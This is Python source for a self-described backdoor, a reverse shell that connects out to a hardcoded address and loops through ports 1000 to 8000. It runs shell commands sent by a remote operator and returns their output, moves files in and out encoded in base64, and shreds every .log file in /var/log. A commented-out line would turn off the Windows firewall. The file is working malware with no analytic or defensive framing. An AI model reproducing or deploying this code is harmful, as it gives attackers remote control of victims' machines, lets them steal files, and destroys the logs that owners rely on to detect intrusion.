# the backdoor
import socket
import os
import sys
import subprocess
import json
import base64

class BackDoor:
    def __init__(self,target,port):
        #<Disable firewall(only in admin mode)>subprocess.call('netsh advfirewall set currentprofile state off',shell=True)
        self.target=target
        self.port=port
        self.__sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.__sock.connect((self.target,self.port))
        except:
            self.__sock.close()
            sys.exit();
        print("Connected")
    def __exec_command(self,msg):
        try:
            ok=subprocess.check_output(msg,shell=True)#,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            if isinstance(ok,str):
                raise Exception("cant be string")
            return ok.decode()
        except Exception as e:
            print(e)
            return "OK"
    def change_dir(self,gg):
        try:
            os.chdir(os.path.join(os.getcwd(),gg))
            print("Directory Changed")
            return "ok"
        except Exception as e:
            print(e)
            try:
                os.chdir(gg)
                print("Directory Changed")
                return "ok"
            except:
                return "NOt ok"
        return "Not OK"
    def __send_data(self,msg):
        try:
            msg=json.dumps(msg)
        except:
            msg=json.dumps({'msg':'Error'})
        self.__sock.send(msg.encode())
    def __download(self,filename):
        ok=None
        msg={'name':filename,'byt':''}
        msg['msg']='skip'
        try:
            with open(filename,'rb') as f:
                ok=f.read()
            msg['byt']=base64.b64encode(ok).decode()
            print(msg['byt'].__len__())
            print("File Saved")
        except Exception as e:
            #print(e)
            print("Not Done Properly")
        self.__send_data(msg)
        return
    def __upload(self,data):
        try:
            name=data.get("name")
            byte=base64.b64decode(data.get('byt').encode())
            if not byte:
                print("NO data from file")
                return
            with open(name,'wb') as f:
                f.write(byte)
            msg={'msg':'File is uploaded'}
            self.__send_data(msg)
        except Exception as e:
            print(e)
            msg={'msg':"Problem in uploading file"}
            self.__send_data(msg)
        return
    def close(self):
        self.__sock.close()
    def deleteEV(self):
        ''' Extra Measures '''
        for i in os.listdir('/var/log'):
            exts=os.path.splitext(i);
            if '.log' in exts:
                subprocess.call(f'shred -n 15 {os.path.join("/var/log/",i)}',shell=True)
        print('[+] logs are cleared ')
        return ;
    def __rec(self,code=4096):
        res=self.__sock.recv(code)
        result=json.loads(res.decode())
        if result.get('msg')==None or result.get('msg')=='Error':
            return "Nothing is sent from client"
        return result
    def run(self):
        done=False
        while not done:
            recieved=self.__rec(99999)
            if not recieved.get('first') and recieved.get('msg')!='ALERT':
                msg=self.__exec_command(recieved.get('msg'))
                msg={'msg':msg}
                self.__send_data(msg)
                continue
            
            command=recieved.get('first')
            fff=recieved.get('msg')
            if command=='cd':
                conf=self.change_dir(fff)
                if conf.lower()=="ok":
                    msg={'msg':'Directory CHanged'}
                    print(fff)
                    self.__send_data(msg)
                else:
                    msg={'msg':'Directory Not changed'}
                    self.__send_data(msg)
            elif command!=None  and command.lower()=='download':
                self.__download(fff)
            elif command.lower()=='upload' or command.lower()=='up':
                data={'name':recieved.get('name'),'byt':recieved.get('byt')}
                print(data)
                #data=json.loads(data.decode())
                self.__upload(data)
                
                
                
if __name__=="__main__":
    #port=int(input("POrt:"))
    DD=True
    F=False
    while DD and F==False:
        print("\rConnecting....")
        for i in range(1000,8001,1000):
            try:
                back=BackDoor('10.0.2.15',i)
                back.run()
                DD=False
                F=True
                break
            except:
                DD=False
                
    
    
    
